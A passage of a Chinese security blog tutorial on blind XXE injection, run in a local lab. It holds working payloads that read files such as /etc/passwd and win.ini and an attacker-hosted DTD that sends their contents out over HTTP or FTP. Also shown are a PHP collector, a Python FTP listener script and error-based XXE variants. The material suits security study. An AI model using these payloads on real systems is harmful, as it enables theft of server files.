+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">::1 - - [06/Oct/2017:11:31:18 +0800] &quot;GET /2.txt HTTP/1.0&quot; 200 49 &quot;-&quot; &quot;-&quot;<br>127.0.0.1 - - [06/Oct/2017:11:31:18 +0800] &quot;POST /XXE/test.php HTTP/1.1&quot; 200 1527 &quot;http://127.0.0.1/XXE/test.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;<br></code></pre></td></tr></table></figure>
+
+<p>同样的，都成功了，那么就存在外部实体引入，那就很可能存在XXE注入，因为他是无回显的，所以我<br>们只能用 blind xxe 来达到攻击效果。</p>
+<p>blind xxe 的原理很简单，就是建立一条带外信道提取数据，利用外部实体中的 URL 发出访问，从而跟攻击者的公网主机<br>，也就是一台攻击者的服务器，从而达到数据的读取。</p>
+<p>我们还是利用上面的那个那个代码来当环境，来本地搭建解释下这个原理。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;<br>	&lt;textarea name=&quot;keyword&quot; value=&quot;&quot; style=&quot;width: 500px; height: 300px&quot;&gt;&lt;/textarea&gt;<br>	&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br>&lt;/form&gt;<br><br>&lt;?php<br>$keyword = $_POST[&#x27;keyword&#x27;];<br>$xml_obj = simplexml_load_string($keyword);<br>echo &quot;---shiyan----&quot; ;<br>print_r($xml_obj);<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后，我们开始构造 payload 1 的 XML 代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///G:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.1.106/XXE/ceshi/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>其中，第三行把 file 找到的内容赋值给参数 %file ，然后第四行为外部引入攻击者自己服务器的 DTD 文档<br>然后第五行执行下这个参数 %remote; ，第六行的 %send; 为攻击者自己服务器的 DTD文档 里的参数实体。</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.106/XXE/ceshi/evil.dtd">http://192.168.1.106/XXE/ceshi/evil.dtd</a> 的内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> </span><br><span class="hljs-meta"><span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM </span></span><br><span class="hljs-string"><span class="hljs-meta">&#x27;http://192.168.1.106/XXE/ceshi/1.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%all;<br></code></pre></td></tr></table></figure>
+
+<p>这里是参数实体 %all 的值为后面 “” 这个字符串里的内容，而这个字符串里的内容为把一开始发送的<br>payload 1 里的 file协议 找到的内容作为参数发送到攻击者着的服务器里的另一个 1.php 文件里，<br>而这个字符串赋值给了参数 %send; ，在这里先运行了下 %all; 所以在一开始的那个 payload 1 里<br>只运行了 %send; 这个值是上面解释的那些内容，那我们再看下这个 1.php 里到底是什么内容吧。</p>
+<p>1.php 内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>就是把接受到的参数写到 1.TXT 这个文档里，可能看到这里，会有点乱的感觉，我在整理下思路。<br>整个过程都是本地的，只是模拟下原理，攻击者（公网） 向存在 XXE 漏洞的服务器发送了一条payload<br>，这个 payload 的功能是查找服务器本机某个文件，然后向攻击者着的服务器请求一条URL请求，获取这个<br>恶意的 dtd 内容，当存在漏洞的服务器读取到这个 dtd 的内容为把一开始自己找的本地的那个文件<br>内容做为参数去传递给攻击者服务器的这个 1.php 文件，这个1.php 的文件是把获取的这个参数本地保存<br>下来，从而，就这样的得到了回显的内容。</p>
+<p>在那个 dtd 文档里，用编码 &#x25; 代替了 % 是因为嵌套引用外部参数实体，如果直接利用%，在引用的时候会导致找不到该参数实体名称<br>，我们先演示一下上面的样例。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">192.168.1.106 - - [06/Oct/2017:17:04:20 +0800] &quot;GET /XXE/ceshi/evil.dtd HTTP/1.0&quot; 200 108 &quot;-&quot; &quot;-&quot;<br>192.168.1.106 - - [06/Oct/2017:17:04:20 +0800] &quot;GET /XXE/ceshi/1.php?file=shiyan521,nishizuiyouxiudebaimaozi! HTTP/1.0&quot; 200 - &quot;-&quot; &quot;-&quot;<br>127.0.0.1 - - [06/Oct/2017:17:04:20 +0800] &quot;POST /XXE/ceshi/test1.php HTTP/1.1&quot; 200 603 &quot;http://127.0.0.1/XXE/ceshi/test1.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;<br></code></pre></td></tr></table></figure>
+
+<p>我们查看日志，可以发现这个攻击成功了，但是有一点，就是这样的读取文件的时候，如果文件里存在空格<br>和尖括号的时候，这这种读取方式就会报错，然后攻击失败，由于本机环境是用的PHP的环境，所以可以<br>使用 php:&#x2F;&#x2F;filter读取base64编码 这个方式来读取，就不会出错了，那我们改下 payload 1 来测试下。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.1.106/XXE/ceshi/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>我们查看下那个 1.txt 文件，</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCg==<br></code></pre></td></tr></table></figure>
+
+
+<p>是 base64 编码的，我们解码一下。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">; for 16-bit app support<br>[fonts]<br>[extensions]<br>[mci extensions]<br>[files]<br></code></pre></td></tr></table></figure>
+
+
+<p>成功的读取到了文件内容，这就是简单的原理，一般我们都是用的 vps ，然后利用 ftp 协议来<br>读取的，那我们再演示一下真正的攻击过程。</p>
+<p>这个思路和上面的原理一样，准备一台客户端，可以内网，当然公网主机最好了，然后存在漏洞的web服务器，<br>和 VPS ，如果直接公网主机的话，那就省了。</p>
+<ol>
+<li>客户端发送 payload 1 给存在漏洞的 web 服务器</li>
+<li>web 服务器向 VPS 获取到恶意的 DTD ，并执行读取到的这个恶意的 DTD 内容</li>
+<li>web 服务器把读取本机的那个文件的内容去访问特定 FTP 或者 HTTP </li>
+<li>攻击者通过 VPS 监听这个特定的端口得到回显的内容</li>
+</ol>
+<p>payload 1 ：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://攻击者公网主机地址/test.xml&quot;</span>&gt;</span>%remote;]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>和上面的思路一样，把 payload 1 发送给存在漏洞的 Web 服务器，然后存在漏洞的 web 服务器<br>会去访问这个 xml 的内容。</p>
+<p>test.xml ：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">aaa</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; bbb SYSTEM &#x27;ftp://攻击者（公网）:xx/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%aaa;<br>%bbb;<br></code></pre></td></tr></table></figure>
+
+<p>端口可以随便设置一些空闲的端口，看到这里，是不是和上面的思路差不多，都是通过<br>URL来带入参数的。</p>
+<p>这里说一下，结合着上面的内容，我们都需要把 &lt; &gt; “ ‘ 都HTML实体编码一下，payload 1 的编码就行了，第二个只需要<br>编码那一个符号就行，我已经编码了。</p>
+<p>&lt;  &lt;  小于<br>&gt;  &gt;  大于<br>&apos;  ‘  单引号<br>&quot;  “  双引号</p>
+<p>由于我本人没有公网的 VPS 所以，这个就不实体再编码一下了，毕竟，我没实战漏洞环境和<br> VPS 啊啊啊啊！！！</p>
+<p>当我们把这 test.xml 部署好后，然后向存在漏洞的 Web 服务器发送 payload 1 的内容后，<br>我们剩下的就是在 VPS 里，打开 ftp.py 监听 自己设置的特定端口就行了。</p>
+<p>我本地复现了使用 ftp.py 的过程，但是由于我环境的问题还是什么原因，接受的结果都是无法正常获取信息，不过<br>作为笔记，我还是把过程写下来。</p>
+<ol>
+<li>打开虚拟机环境部署上面那个一直用的测试xml的PHP代码（192.168.1.112）</li>
+<li>本机环境下添加 shiyan.xml 内容，并打开 XAMPP 集成环境工具（192.168.1.106）</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">aaa</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; bbb SYSTEM &#x27;ftp://192.168.1.106:1314/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%aaa;<br>%bbb;<br></code></pre></td></tr></table></figure>
+
+<p>由于在传输信息中，有空格或者有换行的，都无法正常获取的，所以我继续用了 php:&#x2F;&#x2F;filter读取base64编码 这个编码<br>来读取信息，正常实战环境中，好像不用，，，，我看 i春秋 上面的那个就是直接利用 file协议 。</p>
+<ol start="3">
+<li>打开 cmd 运行监听 ftp 的 ftp.py 的脚本，由于我本人对 socket 真心不太会，就懂个开启一个链接，然后设置下端口<br>开始监听，和一些简单的传输，我用的 luan 的 ftp.py 的脚本，下面贴一下核心简版的，毕竟传播 exp 是那个啥的行为。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,sys<br>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">1314</span>))<br>s.listen(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;XXE-FTP listening&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>	ss, addr = s.accept()<br>	ss.settimeout(<span class="hljs-number">1</span>)<br>	<span class="hljs-keyword">try</span>:<br>		data = ss.recv(<span class="hljs-number">10240</span>).rstrip(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>		<span class="hljs-keyword">if</span> data[:<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;GET /&#x27;</span>:<br>			<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;HTTP connect from&#x27;</span> , <span class="hljs-string">&#x27;:&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x:<span class="hljs-built_in">str</span>(x),addr))<br>			<span class="hljs-built_in">print</span> data<br>			<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;\n\n&#x27;</span><br>			ss.send(dtd)<br>	<span class="hljs-keyword">except</span> socket.timeout:<br>		<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;FTP connect from&#x27;</span> , <span class="hljs-string">&#x27;:&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x:<span class="hljs-built_in">str</span>(x),addr))<br>		ss.settimeout(<span class="hljs-literal">None</span>)<br>		ss.send(<span class="hljs-string">&#x27;220 web Server\r\n&#x27;</span>)<br>		<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Data:&#x27;</span><br>		<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>			data = ss.recv(<span class="hljs-number">10240</span>).rstrip(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>			<span class="hljs-keyword">if</span> data[:<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;USER&#x27;</span>:<br>				ss.send(<span class="hljs-string">&#x27;200 Ok\r\n&#x27;</span>)<br>			<span class="hljs-keyword">elif</span> data[:<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;TYPE&#x27;</span>:<br>				ss.send(<span class="hljs-string">&#x27;200 Ok\r\n&#x27;</span>)<br>			<span class="hljs-keyword">elif</span> data[:<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;SIZE&#x27;</span>:<br>				ss.send(<span class="hljs-string">&#x27;200 Ok\r\n&#x27;</span>)<br>			<span class="hljs-keyword">elif</span> data[:<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;CWD&#x27;</span>:<br>				sys.stdout.write(data[<span class="hljs-number">4</span>:].rstrip(<span class="hljs-string">&#x27;/web&#x27;</span>))<br>				<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>					sys.stdout.write(<span class="hljs-string">&#x27;/&#x27;</span>)<br>				ss.send(<span class="hljs-string">&#x27;200 Ok\r\n&#x27;</span>)<br>			<span class="hljs-keyword">elif</span> data[:<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;EPRT&#x27;</span>:<br>				lan_ip = data.split(data[<span class="hljs-number">5</span>])[<span class="hljs-number">2</span>]<br>				<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;\n=================================&#x27;</span><br>				<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Got IP =&gt;&#x27;</span>,lan_ip<br>				ss.send(<span class="hljs-string">&#x27;200 Ok\r\n&#x27;</span>)<br>			<span class="hljs-keyword">else</span>:<br>				ss.send(<span class="hljs-string">&#x27;666 web\r\n&#x27;</span>)<br>				<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;\nspecial command received:&#x27;</span>,data<br>				<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;\n\n&#x27;</span><br>				<span class="hljs-keyword">break</span><br>	ss.close()<br>s.close() <br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>向服务器端发送 payload 1 的内容（POST 192.168.1.112）</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.1.106/XXE/shiyan.xml&quot;</span>&gt;</span>%remote;]&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<ol start="5">
+<li>虽说我的 ftp.py 报错了，但是还是接受到一堆数据。。。（PS：他的这个ftp，要是懂的话，还得再改改，不懂的话，<br>  就直接用下面压缩包里 ichunqiu 里的那个 ftp.py 把）</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">shiyan</span>&gt;<span class="hljs-title">G</span>:/<span class="hljs-title">shiyan.py</span></span><br><span class="hljs-function"><span class="hljs-title">XXE</span>-<span class="hljs-title">FTP</span> <span class="hljs-title">listening</span></span><br><span class="hljs-function"><span class="hljs-title">FTP</span> <span class="hljs-title">connect</span> <span class="hljs-title">from</span> 192.168.1.112:1165</span><br><span class="hljs-function"><span class="hljs-title">Data</span>:</span><br><span class="hljs-function">/<span class="hljs-title">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCltNYWlsXQ0KTUFQST0xDQpbTUNJIEV4dGVuc2lvbnMuQkFLXQ0KYWlmPU1QRUdWaWRlbw0KYWlmYz1NUEVHVmlkZW8NCmFpZmY9TVBFR1ZpZGVvDQphc2Y9TVBFR1ZpZGVvDQphc3g9TVBFR1ZpZGVvDQphdT1NUEVHVmlkZW8NCm0xdj1NUEVHVmlkZW8NCm0zdT1NUEVHVmlkZW8NCm1wMj1NUEVHVmlkZW8NCm1wMnY9TVBFR1ZpZGVvDQptcDM9TVBFR1ZpZGVvDQptcGE9TVBFR1ZpZGVvDQptcGU9TVBFR1ZpZGVvDQptcGVnPU1QRUdWaWRlbw0KbXBnPU1QRUdWaWRlbw0KbXB2Mj1NUEVHVmlkZW8NCnNuZD1NUEVHVmlkZW8NCndheD1NUEVHVmlkZW8NCndtPU1QRUdWaWRlbw0Kd21hPU1QRUdWaWRlbw0Kd212PU1QRUdWaWRlbw0Kd214PU1QRUdWaWRlbw0Kd3BsPU1QRUdWaWRlbw0Kd3Z4PU1QRUdWaWRlbw0K</span>/</span><br><span class="hljs-function"><span class="hljs-title">special</span> <span class="hljs-title">command</span> <span class="hljs-title">received</span>: <span class="hljs-title">MDTM</span> /<span class="hljs-title">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCltNYWlsXQ0KTUFQST0xDQpbTUNJIEV4dGVuc2lvbnMuQkFLXQ0KYWlmPU1QRUdWaWRlbw0KYWlmYz1NUEVHVmlkZW8NCmFpZmY9TVBFR1ZpZGVvDQphc2Y9TVBFR1ZpZGVvDQphc3g9TVBFR1ZpZGVvDQphdT1NUEVHVmlkZW8NCm0xdj1NUEVHVmlkZW8NCm0zdT1NUEVHVmlkZW8NCm1wMj1NUEVHVmlkZW8NCm1wMnY9TVBFR1ZpZGVvDQptcDM9TVBFR1ZpZGVvDQptcGE9TVBFR1ZpZGVvDQptcGU9TVBFR1ZpZGVvDQptcGVnPU1QRUdWaWRlbw0KbXBnPU1QRUdWaWRlbw0KbXB2Mj1NUEVHVmlkZW8NCnNuZD1NUEVHVmlkZW8NCndheD1NUEVHVmlkZW8NCndtPU1QRUdWaWRlbw0Kd21hPU1QRUdWaWRlbw0Kd212PU1QRUdWaWRlbw0Kd214PU1QRUdWaWRlbw0Kd3BsPU1QRUdWaWRlbw0Kd3Z4PU1QRUdWaWRlbw0K</span></span><br><span class="hljs-function"><span class="hljs-title">FTP</span> <span class="hljs-title">connect</span> <span class="hljs-title">from</span> 192.168.1.112:1166</span><br><span class="hljs-function"><span class="hljs-title">Data</span>:</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">special</span> <span class="hljs-title">command</span> <span class="hljs-title">received</span>: <span class="hljs-title">EPSV</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>由于是报错状态，所以脚本没有正常退出，不过通过 base64解码还是能得到传输的数据</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http">; for 16-bit app support<br>[fonts]<br>[extensions]<br>[mci extensions]<br>[files]<br>[Mail]<br>MAPI=1<br>[MCI Extensions.BAK]<br></code></pre></td></tr></table></figure>
+
+<p>总体来说也就这些东西。</p>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-074069">http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-074069</a><br><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/69">https://security.tencent.com/index.php/blog/msg/69</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/u011721501/article/details/43775691">http://blog.csdn.net/u011721501/article/details/43775691</a><br><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/open/58939">https://www.ichunqiu.com/open/58939</a><br><a target="_blank" rel="noopener" href="https://thief.one/2017/06/20/1/">https://thief.one/2017/06/20/1/</a><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3841.html">http://bobao.360.cn/learning/detail/3841.html</a></p>
+<p>两个 ftp.py （一个是 ichunqiu 的，一个是luan的，ichunqiu 的我应该没看错代码）：</p>
+<p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1c8loEq">https://pan.baidu.com/s/1c8loEq</a> 密码: tq8p</p>
+<p>PS：ftp.py 主要是使用ftp协议，而ftp协议不同于http协议是，http是一次性的数据包，而我们的数据都是在URL中，如果<br>读取的文件中出现空格或者换行就违背了协议，无法传输，所以一开始那个我用的编码来传输，而 ftp 是交互式的，先建立连接<br>然后根据不停的状态码的交互，最后获取到数据，所以空格，换行没什么问题，这也是 ftp.py 里后面我不懂的那些部分代码</p>
+<p>容易存在XXE的地方：<br>1.基于XML的RPC服务 或 基于SOAP的WebService<br>2.开发框架的对Content-Type智能识别导致的XXE<br>3.使用SAML的登录接口<br>4.解析DOCX文件</p>
+<p>强制报错回显：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxe.sh1yan.top/shiyan.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">search</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">search</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>DTD文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payload</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">paraml</span> <span class="hljs-string">&#x27;&lt;!ENTITY % external SYSTEM &quot;file:///nothere/%payload;&quot;&gt;&#x27;</span>&gt;</span><br>%paraml;<br>%external;<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" class="category-chain-item">漏洞研究</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web%E6%BC%8F%E6%B4%9E/" class="print-no-link">#web漏洞</a>
+      
+        <a href="/tags/XXE/" class="print-no-link">#XXE</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>漏洞学习之XXE注入</div>
+      <div>https://sh1yan.top/2018/09/15/xxe-study/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2018年9月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/11/16/soulapp-test/" title="以soul为样本的APP测试总结（待详细）">
